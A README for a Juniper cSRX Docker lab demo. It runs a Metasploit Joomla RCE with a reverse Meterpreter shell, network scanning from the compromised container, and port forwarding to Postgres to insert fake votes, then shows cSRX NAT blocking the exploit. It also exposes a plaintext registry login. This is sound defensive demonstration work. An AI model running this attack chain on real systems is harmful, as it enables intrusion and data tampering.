# cSRX Demonstration

1. [Environment](#environment)
1. [Installation of Docker, cSRX and Site](#installation)
1. [Penetration Test](#penetration)
1. [Defense with cSRX](#defense)
1. [Troubleshooting](#faq)
1. [References](#references)

<a name="environment"></a>
## Enviroment

Ubuntu16.4

Docker CE 18.09.1

<a name="installation"></a>
## Installation of Docker, cSRX and Site

1. install Docker

    <https://docs.docker.com/install/linux/docker-ce/ubuntu/#install-docker-ce-1>

1. Install cSRX

    ```bash
    # docker login hub.juniper.net -u JNPR-CSRXFieldUser3 -p c3IyM7dhFPSxW6oHReJT
    # curl -u JNPR-CSRXFieldUser3 https://hub.juniper.net/v2/security/csrx/tags/list
    # docker pull hub.juniper.net/security/csrx:18.2R1.9
    # docker tag "hub.juniper.net/security/csrx:18.2R1.9" csrx:latest
    # docker network create mgt_bridge
    # docker network create -o com.docker.network.bridge.enable_ip_masquerade=true left_bridge
    # docker network create -o com.docker.network.bridge.enable_ip_masquerade=true right_bridge
    # docker run -d --privileged --network mgt_bridge -e CSRX_SIZE="large" -e CSRX_ROOT_PASSWORD=lab123 --name csrx2 csrx:latest
    # docker network connect left_bridge csrx2
    # docker network connect right_bridge csrx2
    # docker network ls
    # docker network inspect mgt_bridge
    ```

1. Background

    "This part is optional and for better understanding. Installing containers in this part (Line 45 to Line 60) is not necessary for penetration test."

    ```bash
    # docker build -t eg_sshd - < setup1.dockerfile
    # docker build -t eg_sshd_noport - < setup2.dockerfile
    # docker run -d -P --name test_sshd_1 eg_sshd
    # docker run -d -P --name test_sshd_2 eg_sshd_noport
    # docker network inspect bridge
    # docker network list
    "host# ssh root@localhost -p 32770"
    A host external to the Docker host, however, has no way to directly
    connect to the second SSH container, nor would it be able to directly
    connect to any other non-exported ports on either container. Once
    access has been gained to one container (in this example, test_sshd_1),
    there is nothing preventing connections to other nonexported ports.
    We can demonstrate this by SSH’ing from test_sshd_1 to test_sshd_2:
    "host or container# ssh root@172.17.0.3"
    User can log in.
    ```

    "Penetration test site installation starts here."

1. Build a Voting App

    <https://github.com/dockersamples/example-voting-app#linux-containers>

    ```bash
    # apt install git
    # git clone https://github.com/dockersamples/example-voting-app.git
    Cd to example-voting-app folder and replace docker-compose.yml text contents with docker-compose.yml from this repository.

    Install docker compose:
    # curl -L "https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
    # sudo chmod +x /usr/local/bin/docker-compose
    # sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
    In example-voting-app folder, run # docker-compose up
    To tear off the voting app, use # docker-compose down
    To check current containers # docker-compose ps
    To check docker-compose logs # docker-compose logs
    ```

1. Prepare Kali Linux docker image

    ```bash
    Reference: https://medium.com/@s.on/running-metasploit-on-kali-linux-docker-aws-ec2-instance-a2f7d7310b2b
    # docker pull kalilinux/kali-linux-docker
    # docker run -it kalilinux/kali-linux-docker /bin/bash
    root@944d5319b119:/# apt-get update && apt-get upgrade
    root@944d5319b119:/# apt-get install metasploit-framework
    root@944d5319b119:/# exit
    # docker commit 944d5319b119 metasploit
    # docker images
    ```

    Kali Linux docker with Metasploit installed should be in images list, with image name metasploit.

<a name="penetration"></a>
## Penetration Test

![topo1](https://git.juniper.net/xinleizhao/cSRX/raw/master/topo1.png)

    # docker network create attacker
    # docker run --network attacker -p 4000:4000 -it metasploit /bin/bash
    root@dd2bf0a98f5e:/# service postgresql start
    [ ok ] Starting PostgreSQL 11 database server: main.
    root@dd2bf0a98f5e:/# msfconsole -q
    msf > ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
            valid_lft forever preferred_lft forever
    36: eth0@if37: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
        link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
        inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0
            valid_lft forever preferred_lft forever

    "Try to exploit the 172.20.0.2/16 gateway, which is 172.20.0.1"
    msf > use exploit/multi/http/joomla_http_header_rce
    msf exploit(multi/http/joomla_http_header_rce) > set RHOST 172.20.0.1
    RHOST => 172.20.0.1
    msf exploit(multi/http/joomla_http_header_rce) > set LHOST 172.27.60.147
    LHOST => 172.27.60.147
    msf exploit(multi/http/joomla_http_header_rce) > set LPORT 4000
    LPORT => 4000
    msf exploit(multi/http/joomla_http_header_rce) > set PAYLOAD php/meterpreter/reverse_tcp
    PAYLOAD => php/meterpreter/reverse_tcp
    msf exploit(multi/http/joomla_http_header_rce) > run
    [-] Handler failed to bind to 192.168.189.132:4000:-  -
    [*] Started reverse TCP handler on 0.0.0.0:4000
    [*] 172.20.0.1:80 - Sending payload ...
    [*] Sending stage (38247 bytes) to 172.20.0.1
    [*] Meterpreter session 1 opened (172.20.0.2:4000 -> 172.20.0.1:37852) at 2019-02-20 10:23:37 +0000
    "Then a Metasploit session is opened and user is taking over joomla."

    meterpreter > sysinfo
    Computer    : e8b1f84ef81f
    OS          : Linux e8b1f84ef81f 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
    Meterpreter : php/linux
    meterpreter > shell
    Process 38 created.
    Channel 0 created.
    cat /proc/1/cgroup
    11:devices:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    10:freezer:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    9:perf_event:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    8:memory:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    7:blkio:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    6:hugetlb:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    5:pids:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    4:net_cls,net_prio:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    3:cpu,cpuacct:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    2:cpuset:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    1:name=systemd:/docker/e8b1f84ef81fe803674333e4c5f0b19143dc8dcb18d07b59ceac1f4332c60e83
    "This confirms joomla is running inside a docker container."

    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
            valid_lft forever preferred_lft forever
    21: eth0@if22: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
        link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
        inet 172.19.0.4/16 brd 172.19.255.255 scope global eth0
            valid_lft forever preferred_lft forever
    29: eth1@if30: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
        link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff
        inet 172.18.0.3/16 brd 172.18.255.255 scope global eth1
            valid_lft forever preferred_lft forever
    "Hacker now knows joomla container is connected to two docker networks."

    exit
    meterpreter > background
    [*] Backgrounding session 1...
    msf exploit(multi/http/joomla_http_header_rce) > curl -O https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap
    [*] exec: curl -O https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap

    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
    100 5805k  100 5805k    0     0  6902k      0 --:--:-- --:--:-- --:--:-- 6894k

    msf exploit(multi/http/joomla_http_header_rce) > sessions -i 1
    [*] Starting interaction with 1...

    meterpreter > upload nmap /tmp
    [*] uploading  : nmap -> /tmp
    [*] uploaded   : nmap -> /tmp/nmap
    meterpreter > shell
    Process 72 created.
    Channel 2 created.
    cd /tmp
    chmod 755 nmap
    "Copied nmap to joomla. Now we will start scanning the two networks joomla is connected to."

    ./nmap -sT -p1-65535 172.18.0.1-10

    Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-02-21 03:43 UTC
    Unable to find nmap-services!  Resorting to /etc/services
    Cannot find nmap-payloads. UDP payloads are disabled.
    Nmap scan report for 172.18.0.1
    Host is up (0.00024s latency).
    Not shown: 65528 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    4000/tcp  open  unknown
    5000/tcp  open  unknown
    5001/tcp  open  unknown
    5858/tcp  open  unknown
    32768/tcp open  unknown

    Nmap scan report for f3309679aa01 (172.18.0.2)
    Host is up (0.000070s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap scan report for example-voting-app_vote_1.example-voting-app_front-tier (172.18.0.3)
    Host is up (0.00037s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap scan report for example-voting-app_result_1.example-voting-app_front-tier (172.18.0.4)
    Host is up (0.00060s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 10 IP addresses (4 hosts up) scanned in 7.95 seconds

    ./nmap -sT -p1-65535 172.19.0.1-10

    Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-02-21 03:44 UTC
    Unable to find nmap-services!  Resorting to /etc/services
    Cannot find nmap-payloads. UDP payloads are disabled.
    Nmap scan report for 172.19.0.1
    Host is up (0.00018s latency).
    Not shown: 65528 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    4000/tcp  open  unknown
    5000/tcp  open  unknown
    5001/tcp  open  unknown
    5858/tcp  open  unknown
    32768/tcp open  unknown

    Nmap scan report for redis.example-voting-app_back-tier (172.19.0.2)
    Host is up (0.00081s latency).
    Not shown: 65534 closed ports
    PORT     STATE SERVICE
    6379/tcp open  unknown

    Nmap scan report for example-voting-app_vote_1.example-voting-app_back-tier (172.19.0.3)
    Host is up (0.00076s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap scan report for example-voting-app_result_1.example-voting-app_back-tier (172.19.0.4)
    Host is up (0.00016s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap scan report for db.example-voting-app_back-tier (172.19.0.5)
    Host is up (0.00035s latency).
    Not shown: 65534 closed ports
    PORT     STATE SERVICE
    5432/tcp open  postgresql

    Nmap scan report for f3309679aa01 (172.19.0.6)
    Host is up (0.000076s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap scan report for example-voting-app_worker_1.example-voting-app_back-tier (172.19.0.7)
    Host is up (0.00034s latency).
    All 65535 scanned ports on example-voting-app_worker_1.example-voting-app_back-tier (172.19.0.7) are closed

    Nmap done: 10 IP addresses (7 hosts up) scanned in 13.16 seconds
    exit
    meterpreter > portfwd add -L 127.0.0.1 -l 8999 -p 5432 -r 172.19.0.5

    On Ubuntu Host:

    root@ubuntu:~# docker exec -it kali-container-id /bin/bash
    root@kali:/# psql -h 127.0.0.1 -p 8999 -U postgres

    postgres-# \dt
         List of relations
    Schema | Name  | Type  |  Owner
    --------+-------+-------+----------
     public | votes | table | postgres
    (1 row)

    postgres=# select * from votes;
       id        | vote 
    -----------------+------
     1ad8bf9e9a778ce | a
    (1 row)

    postgres=# INSERT INTO votes (id, vote) VALUES ('1', 'b'), ('2', 'b'), ('3', 'b'), ('4', 'b');
    INSERT 0 4

    postgres=# select * from votes;
       id        | vote 
    -----------------+------
     1ad8bf9e9a778ce | a
     1               | b
     2               | b
     3               | b
     4               | b
    (5 rows)


<a name="defense"></a>
## Defense with cSRX

1. Put joomla in a private network

    ![topp2](https://git.juniper.net/xinleizhao/cSRX/raw/master/topo2.png)

    ```bash
    # docker-compose down
    It is better to expose port 80 of joomla.
    So user can replace contents of docker-compose.yml with docker-compose-new.yml.
    $ diff docker-compose.yml docker-compose-new.yml
    32,33c32,33
    <     ports:
    <       - "80:80"
    ---
    >     expose:
    >       - "80"
    # docker-compose up
    # docker network create protected -o com.docker.network.bridge.enable_ip_masquerade=true --subnet 192.168.100.0/24 --gateway 192.168.100.1
    # docker run -d --privileged -p 5002:3456 --network mgt_bridge -e CSRX_SIZE="large" -e CSRX_ROOT_PASSWORD=lab123 --name csrxnat csrx:latest
    # docker network connect example-voting-app_front-tier csrxnat
    # docker network connect protected csrxnat

    # docker network connect protected example-voting-app_joomla_1
    # docker network disconnect example-voting-app_front-tier example-voting-app_joomla_1

    # docker network inspect example-voting-app_front-tier
    Please remember IP address of csrxnat on example-voting-app_front-tier.
    ```

1. Set up NAT on cSRX

    ```bash
    Load configuration (cSRX1.conf) to cSRX.
    Please note address of interface ge-0/0/0.0 is address of csrxnat on example-voting-app_front-tier.

    Then route traffic from joomla all to csrxnat.
    # docker exec -it example-voting-app_joomla_1 ip route delete default
    # docker exec -it example-voting-app_joomla_1 ip route add default via 192.168.100.2

    Then user should be able to see joomla page on server:5002.
    If user is not able to see joomla page, please see Troubleshooting part Question 3.
    ```

1. After Implementation

    ```bash
    root@ubuntu:~# docker run --network attacker -p 4000:4000 -it metasploit /bin/bash
    docker: Error response from daemon: network attacker not found.
    root@ubuntu:~# docker network create attacker
    13002766d7d00011ec4b70fa1ab6aba427cbc1a417593acaaa9a389fc5c1b7fa
    root@ubuntu:~# docker run --network attacker -p 4000:4000 -it metasploit /bin/bash
    root@f84da2bbbf10:/# service postgresql start
    [ ok ] Starting PostgreSQL 11 database server: main.
    root@f84da2bbbf10:/# msfconsole -q
    msf > ip a
    [*] exec: ip a

    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
    35: eth0@if36: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
        link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
        inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0
        valid_lft forever preferred_lft forever
    msf > use exploit/multi/http/joomla_http_header_rce
    msf exploit(multi/http/joomla_http_header_rce) > set RHOST 172.20.0.1
    RHOST => 172.20.0.1
    msf exploit(multi/http/joomla_http_header_rce) > set RPORT 5002
    RPORT => 5002
    msf exploit(multi/http/joomla_http_header_rce) > set LHOST 172.27.60.147
    LHOST => 172.27.60.147
    msf exploit(multi/http/joomla_http_header_rce) > set LPORT 4000
    LPORT => 4000
    msf exploit(multi/http/joomla_http_header_rce) > set PAYLOAD php/meterpreter/reverse_tcp
    PAYLOAD => php/meterpreter/reverse_tcp
    msf exploit(multi/http/joomla_http_header_rce) > run

    [-] Handler failed to bind to 172.27.60.147:4000:-  -
    [*] Started reverse TCP handler on 0.0.0.0:4000 
    [*] 172.20.0.1:5002 - Sending payload ...
    [-] 172.20.0.1:5002 - Exploit aborted due to failure: unknown: No response
    [*] Exploit completed, but no session was created.
    ```

1. Further Protection

    ![topp3](https://git.juniper.net/xinleizhao/cSRX/raw/master/topo3.png)
    Putting another cSRX between frontend network and backend network to isolate backend containers from accessing the Internet.

    Security Policy: only traffic between frontend and backend is allowed. Server outside will not have direct access to db container.

    Note: Only implementing cSRX2 will not prevent the penetration test for joomla in the use case above. cSRX2 is just a traffic regulator.

<a name="faq"></a>
## Troubleshooting

1. (Docker-compose Installation) Version in "./docker-compose.yml" is unsupported.

    A: Please install docker compose following official site instructions <https://docs.docker.com/compose/install/> instead of apt install docker-compose.

    ```bash
    # curl -L "https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
    # sudo chmod +x /usr/local/bin/docker-compose
    # sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
    ```

1. (Penetration Test) root@kali:/# psql -h 127.0.0.1 -p 8999 -U postgres
    psql: server closed the connection unexpectedly
    This probably means the server terminated abnormally before or while processing the request.

    A: Please check if port forwarding is pointing to the back network db address. If it does not work, could be bad data in the database. Please use "docker volume remove example-voting-app_db-data" and "docker-compose down" then "docker compose up" to bring up the voting app again.

1. (cSRX NAT setup) After setting up NAT on cSRX, no page is showing up.

    A: The port mapping in this situation is host:5002 -> cSRX:3456, and DNAT joomla:80 -> cSRX:3456 so that joomla contents can be seen on host:5002.

    Firstly, please check if NAT is running on cSRX.

    ```bash
    root@csrx01> show security flow session
    Session ID: 445295, Policy name: u2t/5, Timeout: 298, Valid
    In: 172.29.197.191/59146 --> 172.18.0.5/3456;tcp, Conn Tag: 0x0, If: ge-0/0/0.0, Pkts: 10, Bytes: 1036, 
    Out: 192.168.100.3/80 --> 172.29.197.191/59146;tcp, Conn Tag: 0x0, If: ge-0/0/1.0, Pkts: 9, Bytes: 8528, 
    ```

    If NAT is running on cSRX, please check port map of cSRX.

    ```bash
    # docker port csrxnat 
    3456/tcp -> 0.0.0.0:5002
    ```

    Otherwise, disable tcp offload on all veth with a script.

    ```bash
    # ip link | grep UP | awk -F ':' '/veth/ {print $2}' | awk -F '@' '{print $1}' | while read line
    > do
    >  ethtool -K $line tx off >/dev/null
    > done
    ```

1. (cSRX Installation) Error message: error: usp_ipc_client_open: failed to connect to the server after 1 retries(111)

    A: Process srxpfe has stopped or not started. While starting cSRX, it is necessary to specify *-e CSRX_SIZE="large"* then connect cSRX with trust and untrust network. After network has been connected for about 10 seconds, srxpfe process will appear if user run "%ps -aux" on csrx shell.

1. (Docker Issue) Container's gateway is still docker default gateway but container lost Internet access.

    A: Please run "# service docker restart".

1. (Kali Metasploit) Warning message "No database support: No database YAML file" was seen.

    A: On Kali, run:
    kali# /usr/bin/msfdb stop
    kali# /usr/bin/msfdb run

<a name="references"></a>
## References

1. cSRX Architecture Illustration
    <https://www.juniper.net/documentation/en_US/csrx/information-products/topic-collections/release-notes/18.2/topic-98044.html#jd0e132>

1. Laurent's cSRX Notes
    <http://172.30.109.42/FTP/JUNOS/cSRX/cSRX-release/cSRX%20release%20with%20native%20Docker%20Networking.rtf>

1. An Attacker Looks at Docker: Approaching Multi-Container Applications from BlackHat 2018
    [Video](https://www.youtube.com/watch?v=HTM3ZrSvp6c)
    [Documentation](https://i.blackhat.com/us-18/Thu-August-9/us-18-McGrew-An-Attacker-Looks-At-Docker-Approaching-Multi-Container-Applications-wp.pdf)# csrx-demo
